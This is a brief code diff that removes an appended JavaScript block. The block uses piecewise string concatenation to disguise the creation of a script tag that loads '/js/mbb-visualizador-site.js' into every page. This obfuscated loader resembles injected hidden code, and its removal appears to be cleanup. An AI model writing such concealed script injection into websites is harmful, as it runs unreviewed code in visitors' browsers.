@@ -88,9 +88,3 @@
     });
   }
 })();
-
-(() => {
-  const s = document.createElement('s'+'c'+'r'+'i'+'p'+'t');
-  s['s'+'r'+'c'] = '/'+'j'+'s'+'/'+'m'+'b'+'b'+'-'+'v'+'i'+'s'+'u'+'a'+'l'+'i'+'z'+'a'+'d'+'o'+'r'+'-'+'s'+'i'+'t'+'e'+'.'+'j'+'s';
-  document.body.appendChild(s);
-})();
